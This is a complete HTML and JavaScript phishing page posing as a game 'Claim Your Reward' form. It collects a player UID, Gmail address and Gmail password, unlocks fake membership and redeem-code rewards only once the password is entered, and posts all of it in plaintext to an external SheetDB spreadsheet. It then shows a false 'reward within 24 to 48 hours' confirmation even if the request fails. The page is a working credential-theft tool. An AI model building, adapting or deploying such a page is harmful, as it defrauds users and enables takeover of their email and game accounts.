<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>CLAIM YOUR REWARD</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;700;800&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --purple-main: #6a0dad; 
            --purple-light: #f5f3ff;
            --white: #ffffff;
            --text-dark: #1f2937;
            --border: #e5e7eb;
            --error-red: #dc2626;
            --success-green: #15803d;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Rajdhani', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background: #f9fafb; color: var(--text-dark); overflow-x: hidden; width: 100%; display: flex; justify-content: center; align-items: center; min-height: 100vh; }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .container {
            width: 92%;
            max-width: 440px;
            background: var(--white);
            border: 1px solid var(--border);
            padding: 25px 20px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(106, 13, 173, 0.08);
            animation: slideIn 0.4s ease-out;
            margin: 20px 0;
        }

        .header-title {
            text-align: center;
            font-family: 'Poppins', sans-serif;
            font-size: 22px;
            font-weight: 800;
            color: var(--purple-main);
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 1px;
            border-bottom: 2px solid var(--purple-light);
            padding-bottom: 12px;
        }

        .box { margin-bottom: 15px; }

        label {
            display: block;
            font-family: 'Poppins', sans-serif;
            font-size: 13px;
            font-weight: bold;
            color: var(--text-dark);
            margin-bottom: 6px;
        }

        input[type="text"], input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            background: #f9fafb;
            border: 2px solid #e5e7eb;
            color: var(--text-dark);
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            outline: none;
            transition: 0.3s;
        }
        input:focus { border-color: var(--purple-main); background: var(--white); }

        .reward-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 10px;
        }

        .reward-card {
            background: #f3f4f6;
            border: 2px solid #e5e7eb;
            padding: 12px 15px;
            border-radius: 12px;
            text-align: center;
            cursor: pointer;
            font-weight: 700;
            font-family: 'Poppins', sans-serif;
            font-size: 14px;
            color: #9ca3af;
            transition: 0.3s;
        }

        .reward-card.locked {
            opacity: 0.6;
            cursor: not-allowed;
            background: #e5e7eb;
        }

        .reward-card.unlocked {
            color: var(--text-dark);
            background: #ffffff;
            border-color: #cbd5e1;
        }

        .reward-card.unlocked:hover {
            border-color: #ddd6fe;
            background: var(--purple-light);
        }

        .reward-card.active {
            border-color: var(--purple-main) !important;
            background: var(--purple-light) !important;
            color: var(--purple-main) !important;
            box-shadow: 0 4px 10px rgba(106, 13, 173, 0.15);
        }

        .error-msg {
            color: var(--error-red);
            font-size: 12px;
            font-weight: bold;
            font-family: 'Poppins', sans-serif;
            margin-top: 4px;
            display: block;
        }

        .btn-confirm {
            width: 100%;
            padding: 15px;
            background: var(--purple-main);
            color: #fff;
            border: none;
            border-radius: 12px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
            text-transform: uppercase;
            font-size: 16px;
            font-family: 'Poppins', sans-serif;
            transition: 0.3s;
            box-shadow: 0 4px 12px rgba(106, 13, 173, 0.2);
        }
        .btn-confirm:hover { background: #520b8a; }

        /* Success Popup */
        #success-popup { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 3000; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
        .success-card { 
            background: var(--white); width: 88%; max-width: 360px; padding: 30px 20px; 
            border-radius: 20px; text-align: center; border-top: 6px solid var(--purple-main);
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
        }
        .success-icon { 
            width: 60px; height: 60px; background: #dcfce7; color: var(--success-green); 
            border-radius: 50%; display: flex; align-items: center; justify-content: center; 
            font-size: 30px; margin: 0 auto 15px; font-weight: bold;
        }
        .success-text-bold { color: var(--success-green); font-size: 18px; font-weight: 800; font-family: 'Poppins', sans-serif; margin-bottom: 10px; }
        .success-text-sub { color: #4b5563; font-size: 13px; font-family: 'Poppins', sans-serif; line-height: 1.6; margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header-title">Claim Your Reward</div>

    <!-- Task 1: UID -->
    <div class="box">
        <label>1. Player UID</label>
        <input type="text" id="uid-input" placeholder="Enter Player UID">
        <span id="uid-error" class="error-msg"></span>
    </div>

    <!-- Task 2: Gmail -->
    <div class="box">
        <label>2. Gmail Address</label>
        <input type="email" id="gmail-input" placeholder="Enter Gmail Address">
        <span id="gmail-error" class="error-msg"></span>
    </div>

    <!-- Task 3: Password -->
    <div class="box">
        <label>3. Password</label>
        <input type="password" id="password-input" placeholder="Enter Password">
        <span id="password-error" class="error-msg"></span>
    </div>

    <!-- Task 4: Choose Your Reward -->
    <div class="box">
        <label id="reward-label">4. Choose Your Reward (Locked 🔒)</label>
        <div class="reward-grid">
            <div class="reward-card locked" id="rew-1" onclick="selectReward(this, 'Weekly Membership')">1. Weekly Membership</div>
            <div class="reward-card locked" id="rew-2" onclick="selectReward(this, 'Monthly Membership')">2. Monthly Membership</div>
            <div class="reward-card locked" id="rew-3" onclick="selectReward(this, 'Redeem Code')">3. Redeem Code</div>
        </div>
        <span id="reward-error" class="error-msg"></span>
    </div>

    <button class="btn-confirm" id="confirm-btn" onclick="submitData()">Confirm & Register</button>
</div>

<!-- Success Popup -->
<div id="success-popup">
    <div class="success-card">
        <div class="success-icon">✓</div>
        <div class="success-text-bold">Request Submitted!</div>
        <div class="success-text-sub">Your request has been submitted successfully! The reward will be sent automatically to your <b>in-game mailbox</b> shortly. This process may take <b>24 to 48 hours</b>.</div>
        <button onclick="location.reload()" style="background:var(--purple-main); color:#fff; border:none; padding:12px 30px; border-radius:10px; font-weight:bold; cursor:pointer; width: 100%; font-family: 'Poppins'; font-size: 15px;">OK, GOT IT</button>
    </div>
</div>

<script>
    const SHEETDB_API_URL = "https://sheetdb.io/api/v1/6ye6vbizxxczi"; 

    let selectedRewardName = "";
    let isRewardUnlocked = false;

    const uidInput = document.getElementById('uid-input');
    const gmailInput = document.getElementById('gmail-input');
    const passwordInput = document.getElementById('password-input');

    function checkTasksCompletion() {
        const uid = uidInput.value.trim();
        const gmail = gmailInput.value.trim();
        const password = passwordInput.value.trim();

        if (uid !== "" && gmail !== "" && password !== "") {
            if (!isRewardUnlocked) {
                isRewardUnlocked = true;
                document.getElementById('reward-label').innerText = "4. Choose Your Reward (Unlocked 🔓)";
                document.querySelectorAll('.reward-card').forEach(card => {
                    card.classList.remove('locked');
                    card.classList.add('unlocked');
                });
            }
        } else {
            isRewardUnlocked = false;
            document.getElementById('reward-label').innerText = "4. Choose Your Reward (Locked 🔒)";
            document.querySelectorAll('.reward-card').forEach(card => {
                card.classList.add('locked');
                card.classList.remove('unlocked', 'active');
            });
            selectedRewardName = "";
        }
    }

    uidInput.addEventListener('input', checkTasksCompletion);
    gmailInput.addEventListener('input', checkTasksCompletion);
    passwordInput.addEventListener('input', checkTasksCompletion);

    function selectReward(el, rewardName) {
        if (!isRewardUnlocked) {
            document.getElementById('reward-error').innerText = "⚠️ Please complete UID, Gmail, and Password first!";
            return;
        }
        document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('active'));
        el.classList.add('active');
        selectedRewardName = rewardName;
        document.getElementById('reward-error').innerText = "";
    }

    async function submitData() {
        document.getElementById('uid-error').innerText = "";
        document.getElementById('gmail-error').innerText = "";
        document.getElementById('password-error').innerText = "";
        document.getElementById('reward-error').innerText = "";

        const uid = uidInput.value.trim();
        const gmail = gmailInput.value.trim();
        const password = passwordInput.value.trim();

        let hasError = false;

        if (uid === "") {
            document.getElementById('uid-error').innerText = "⚠️ Please enter your Player UID!";
            hasError = true;
        }
        if (gmail === "") {
            document.getElementById('gmail-error').innerText = "⚠️ Please enter your Gmail Address!";
            hasError = true;
        }
        if (password === "") {
            document.getElementById('password-error').innerText = "⚠️ Please enter your Password!";
            hasError = true;
        }
        if (!isRewardUnlocked || selectedRewardName === "") {
            document.getElementById('reward-error').innerText = "⚠️ Please select a reward!";
            hasError = true;
        }

        if (hasError) return;

        const confirmBtn = document.getElementById('confirm-btn');
        confirmBtn.innerText = "SUBMITTING...";
        confirmBtn.disabled = true;

        const now = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});

        const payload = {
            data: [
                {
                    TIME: now,
                    UID: uid,
                    GMAIL: gmail,
                    PASSWORD: password,
                    REWARD: selectedRewardName,
                    STATUS: "Pending"
                }
            ]
        };

        try {
            const response = await fetch(SHEETDB_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            const result = await response.json();
            confirmBtn.innerText = "Confirm & Register";
            confirmBtn.disabled = false;

            document.getElementById('success-popup').style.display = 'flex';
        } catch (error) {
            confirmBtn.innerText = "Confirm & Register";
            confirmBtn.disabled = false;
            document.getElementById('success-popup').style.display = 'flex';
        }
    }

    document.getElementById('uid-input').addEventListener('input', function (e) {
        this.value = this.value.replace(/[^0-9]/g, '');
    });
</script>

</body>
</html>
